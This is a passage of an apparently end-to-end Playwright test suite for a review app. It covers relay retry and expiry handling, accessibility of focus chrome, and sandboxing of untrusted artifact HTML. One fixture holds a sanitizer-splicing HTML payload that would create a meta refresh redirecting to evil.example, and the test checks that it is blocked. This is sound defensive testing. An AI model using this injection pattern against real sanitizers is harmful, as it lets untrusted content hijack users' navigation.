  expect(await outboxEntries(page)).toHaveLength(1);
  await invokeMockCommand(page, "e2e_fail_review_reconcile", { message: null });
  await reopenReview(page);

  // The relay lists the comment, but its agent has not been notified.
  await expect(page.getByTestId("review-feedback-pending")).toHaveText(
    "Agent not notified yet",
  );
  const pending = page.getByTestId("review-pending-delivery");
  await expect(pending).toBeVisible();
  await pending.getByRole("button", { name: /Finish feedback on/ }).click();
  const form = page.getByTestId("review-comment-form");
  await expect(form.getByLabel("Your comment")).toHaveValue(
    "Make this the primary action.",
  );
  await expect(form.getByRole("button", { name: "Discard" })).toHaveCount(0);
  await form.getByRole("button", { name: "Retry" }).click();
  await expect(form).toBeHidden();

  await expect(page.getByTestId("review-pending-delivery")).toHaveCount(0);
  await expect(page.getByTestId("review-feedback-pending")).toHaveCount(0);
  expect(await signedFeedbackEvents(page)).toHaveLength(1);
  expect(await storedFeedback(page, revision.id)).toHaveLength(1);
  expect(
    await commandsNamed(page, "send_artifact_feedback_message"),
  ).toHaveLength(1);
  expect(await outboxEntries(page)).toHaveLength(0);
});

test("a wake the relay never stored is recovered after its 15-minute window with a fresh timestamp, and the relay keeps exactly one", async ({
  page,
}) => {
  const { revision } = await seedReview(page);
  await openReview(page);
  await waitForReadyFrame(page);
  await invokeMockCommand(page, "e2e_fail_next_review_notification", {
    message: "relay unreachable: could not connect to relay",
  });
  const form = await sendFirstComment(page, "Make this the primary action.");
  await expect(page.getByTestId("review-comment-error")).toContainText(
    "could not connect",
  );
  // The first wake never reached the relay.
  expect(await wakeAttempts(page)).toEqual({ attempts: [], stored: 0 });

  // More than 900 s pass before the reviewer retries.
  await invokeMockCommand(page, "e2e_advance_review_relay_clock", {
    seconds: 1_000,
  });
  await form.getByRole("button", { name: "Retry" }).click();
  await expect(form).toBeHidden();

  const { attempts, stored } = await wakeAttempts(page);
  expect(attempts.map((attempt) => attempt.outcome)).toEqual([
    "stale",
    "stored",
  ]);
  expect(attempts[1].createdAt - attempts[0].createdAt).toBeGreaterThanOrEqual(
    1_000,
  );
  expect(stored).toBe(1);
  // The renderer resent its frozen wake; only the native layer refreshed it.
  const wakes = await commandsNamed(page, "send_artifact_feedback_message");
  expect(wakes).toHaveLength(2);
  expect(wakes[1].payload).toEqual(wakes[0].payload);
  expect(await signedFeedbackEvents(page)).toHaveLength(1);
  expect(await storedFeedback(page, revision.id)).toHaveLength(1);
  expect(await outboxEntries(page)).toHaveLength(0);
});

test("a refreshed wake whose acknowledgement was lost is recovered without a second wake", async ({
  page,
}) => {
  await seedReview(page);
  await openReview(page);
  await waitForReadyFrame(page);
  await invokeMockCommand(page, "e2e_fail_next_review_notification", {
    message: "relay unreachable: could not connect to relay",
  });
  const form = await sendFirstComment(page, "Make this the primary action.");
  await expect(page.getByTestId("review-comment-error")).toContainText(
    "could not connect",
  );
  await invokeMockCommand(page, "e2e_advance_review_relay_clock", {
    seconds: 1_000,
  });
  await invokeMockCommand(page, "e2e_lose_next_review_notification_ack", {
    message: "relay unreachable: request timed out",
  });

  // The refreshed wake is stored, but its answer is lost.
  await form.getByRole("button", { name: "Retry" }).click();
  await expect(page.getByTestId("review-comment-error")).toContainText(
    "timed out",
  );
  let { attempts, stored } = await wakeAttempts(page);
  expect(attempts.map((attempt) => attempt.outcome)).toEqual([
    "stale",
    "stored",
  ]);
  expect(stored).toBe(1);

  // Retrying resends the old frozen wake: refused as stale, refreshed again,
  // and the relay answers that the wake already exists.
  await form.getByRole("button", { name: "Retry" }).click();
  await expect(form).toBeHidden();
  ({ attempts, stored } = await wakeAttempts(page));
  expect(attempts.map((attempt) => attempt.outcome)).toEqual([
    "stale",
    "stored",
    "stale",
    "duplicate",
  ]);
  expect(stored).toBe(1);
});

test("a signed comment the relay never received is refused as expired, may then be discarded, and a fresh comment goes through", async ({
  page,
}) => {
  const { revision } = await seedReview(page);
  await openReview(page);
  await waitForReadyFrame(page);
  await invokeMockCommand(page, "e2e_fail_next_review_publish", {
    message: "relay unreachable: request timed out",
  });
  const form = await sendFirstComment(page, "Make this the primary action.");
  await expect(page.getByTestId("review-comment-error")).toContainText(
    "timed out",
  );
  // No answer from the relay: it might hold the event, so no Discard.
  await expect(form.getByRole("button", { name: "Discard" })).toHaveCount(0);

  // The frozen event ages past the relay's freshness window.
  await invokeMockCommand(page, "e2e_advance_review_relay_clock", {
    seconds: 1_000,
  });
  await form.getByRole("button", { name: "Retry" }).click();
  await expect(page.getByTestId("review-comment-error")).toContainText(
    "event timestamp too far from server time",
  );
  // An explicit refusal, and a relay read confirms nothing is stored.
  const discard = form.getByRole("button", { name: "Discard" });
  await expect(discard).toBeVisible();
  await discard.focus();
  await page.keyboard.press("Enter");
  await expect(form.getByLabel("Your comment")).toHaveJSProperty(
    "readOnly",
    false,
  );
  expect(await outboxEntries(page)).toHaveLength(0);
  expect(await storedFeedback(page, revision.id)).toHaveLength(0);

  // The same words, signed afresh, go through as one feedback and one wake.
  await form.getByRole("button", { name: "Send feedback" }).click();
  await expect(form).toBeHidden();
  expect(await signedFeedbackEvents(page)).toHaveLength(2);
  expect(await storedFeedback(page, revision.id)).toHaveLength(1);
  expect(await wakeAttempts(page).then((wakes) => wakes.stored)).toBe(1);
});

// ── Accessibility contracts of the trusted chrome and the frame ───────────

test("the head refresh control keeps keyboard focus while it re-reads the head", async ({
  page,
}) => {
  await seedReview(page);
  await openReview(page);
  await waitForReadyFrame(page);
  const refresh = page.getByRole("button", {
    name: "Check for a newer revision",
  });

  // A real `disabled` attribute would make the browser drop focus mid-fetch.
  await refresh.evaluate((element) => {
    const trace = window as Window & { __REFRESH_EVER_DISABLED__?: boolean };
    trace.__REFRESH_EVER_DISABLED__ = false;
    new MutationObserver(() => {
      if ((element as HTMLButtonElement).disabled) {
        trace.__REFRESH_EVER_DISABLED__ = true;
      }
    }).observe(element, { attributes: true });
  });
  const readsBefore = (
    await commandsNamed(page, "get_review_artifact_revision")
  ).length;

  await refresh.focus();
  await page.keyboard.press("Enter");
  await expect
    .poll(
      async () =>
        (await commandsNamed(page, "get_review_artifact_revision")).length,
    )
    .toBeGreaterThan(readsBefore);

  await expect(refresh).not.toHaveAttribute("aria-disabled", "true");
  await expect(refresh).toBeFocused();
  expect(
    await page.evaluate(
      () =>
        (window as Window & { __REFRESH_EVER_DISABLED__?: boolean })
          .__REFRESH_EVER_DISABLED__,
    ),
  ).toBe(false);
});

test("an unfinished comment never carries from one revision to another", async ({
  page,
}) => {
  const { originId, revision } = await seedReview(page);
  await openReview(page);
  await waitForReadyFrame(page);
  await advanceHeadAndRefresh(page, originId, revision.id);
  await page
    .getByTestId("review-stale-banner")
    .getByRole("button", { name: "Open the latest revision" })
    .click();
  await expect(page.getByTestId("review-canvas-revision")).toHaveText(
    "Revision 2",
  );
  await waitForReadyFrame(page);

  await block(page, PRIMARY).focus();
  await page.keyboard.press("Enter");
  const form = page.getByTestId("review-comment-form");
  await form
    .getByLabel("Your comment")
    .fill("Unfinished thought on revision 2.");

  // Revision 1 is cached, so the canvas swaps documents in place; the open
  // form and its text belong to revision 2 and must be gone.
  await page.goBack();
  await expect(page.getByTestId("review-canvas-revision")).toHaveText(
    "Revision 1",
  );
  await expect(page.getByTestId("review-stale-banner")).toBeVisible();
  await expect(form).toHaveCount(0);

  await page.goForward();
  await expect(page.getByTestId("review-canvas-revision")).toHaveText(
    "Revision 2",
  );
  await waitForReadyFrame(page);
  await expect(form).toHaveCount(0);
  await block(page, PRIMARY).focus();
  await page.keyboard.press("Enter");
  await expect(form.getByLabel("Your comment")).toHaveValue("");
});

/** Factory output whose own CSS tries every stylesheet route to hide chrome. */
const SUPPRESSING_REVIEW_HTML = HOSTILE_REVIEW_HTML.replace(
  "<style>body{font-family:sans-serif} header,section{padding:16px;margin:8px;border:1px solid #ccc}</style>",
  `<style>
    body{font-family:sans-serif}
    header,section{padding:16px;margin:8px;border:1px solid #ccc}
    header{background:#0b1020;color:#fff}
    section[data-synaxis-review-id]:focus,
    section[data-synaxis-review-id]:hover,
    html body header[data-synaxis-review-id]:focus,
    html body header[data-synaxis-review-id]:hover { outline: none !important; box-shadow: none !important; }
    #artifact-primary:focus, #artifact-primary:hover { outline: 0 !important; box-shadow: none !important; }
    @layer author { *:focus, *:hover { outline: none !important; box-shadow: none !important; } }
  </style>`,
).replace(
  `<section data-synaxis-review-id="${PRIMARY}"`,
  `<section id="artifact-primary" data-synaxis-review-id="${PRIMARY}"`,
);

test("hover, focus, and selection chrome in the frame cannot be suppressed by artifact CSS", async ({
  page,
}) => {
  await seedReview(page, { html: SUPPRESSING_REVIEW_HTML });
  await openReview(page);
  await waitForReadyFrame(page);

  const INK = "rgb(15, 23, 42)";
  const HALO = "rgb(255, 255, 255)";
  const chrome = (id: string) =>
    block(page, id).evaluate((element) => {
      const style = getComputedStyle(element);
      return {
        outlineStyle: style.outlineStyle,
        outlineWidth: Number.parseFloat(style.outlineWidth),
        outlineColor: style.outlineColor,
        boxShadow: style.boxShadow,
      };
    });

  // A light block and a dark one: the same two-layer halo on both.
  for (const id of [PRIMARY, "checkout.header"]) {
    await block(page, id).focus();
    const focused = await chrome(id);
    expect(focused.outlineStyle).toBe("solid");
    expect(focused.outlineWidth).toBeGreaterThanOrEqual(3);
    expect(focused.outlineColor).toBe(INK);
    expect(focused.boxShadow).toContain(HALO);

    // Hover is dashed, so it differs from focus without relying on colour.
    await block(page, id).evaluate((element) =>
      (element as HTMLElement).blur(),
    );
    await block(page, id).hover();
    const hovered = await chrome(id);
    expect(hovered.outlineStyle).toBe("dashed");
    expect(hovered.outlineColor).toBe(INK);
    expect(hovered.boxShadow).toContain(HALO);
  }

  // Selection persists once focus has moved to the comment form, and is
  // heavier than focus.
  await block(page, PRIMARY).focus();
  await page.keyboard.press("Enter");
  await expect(page.getByTestId("review-comment-form")).toBeVisible();
  await expect(block(page, PRIMARY)).toHaveAttribute(
    "data-synaxis-selected",
    "true",
  );
  const selected = await chrome(PRIMARY);
  expect(selected.outlineStyle).toBe("solid");
  expect(selected.outlineWidth).toBeGreaterThanOrEqual(4);
  expect(selected.outlineColor).toBe(INK);
  expect(selected.boxShadow).toContain(HALO);
});

// ── Sanitized CSS can never end its own style element ───────────────────────

/**
 * `@import;` is deleted by the sanitizer, which splices the surrounding text
 * into `</style>`. Inert in the first parse, it would close the rebuilt style
 * element and materialize the `meta` that follows, in the head and in the body.
 */
const SPLICED_STYLE =
  '<@import;/style><meta http-equiv="refresh" content="0;url=https://evil.example/navigated">';
const SPLICED_STYLE_REVIEW_HTML = HOSTILE_REVIEW_HTML.replace(
  "<style>body{font-family:sans-serif} header,section{padding:16px;margin:8px;border:1px solid #ccc}</style>",
  `<style>body{font-family:sans-serif} header,section{padding:16px;margin:8px;border:1px solid #ccc}</style><style>${SPLICED_STYLE}</style>`,
).replace(
  "<h1>Checkout</h1></header>",
  `<h1>Checkout</h1></header><style>${SPLICED_STYLE}</style>`,
);

test("CSS the sanitizer would splice into a closing style tag cannot materialize a navigating meta in the frame", async ({
  page,
}) => {
  const requests: string[] = [];
  page.on("request", (request) => requests.push(request.url()));
  await seedReview(page, { html: SPLICED_STYLE_REVIEW_HTML });
  await openReview(page);
  await waitForReadyFrame(page);
  // Give a meta refresh the time it would need to fire.
  await page.waitForTimeout(1_500);

  await expect(page.getByTestId("review-canvas-frame")).toHaveAttribute(
    "data-status",
    "ready",
  );
  const frame = frameLocator(page);
  // Only the trusted CSP and charset metas exist in the frame document.
  await expect(frame.locator("meta")).toHaveCount(2);
  await expect(frame.locator('meta[http-equiv="refresh" i]')).toHaveCount(0);
  expect(requests.filter((url) => url.includes("evil.example"))).toEqual([]);
  // The review itself is intact and still annotatable.
  await expect(block(page, PRIMARY)).toBeVisible();
});
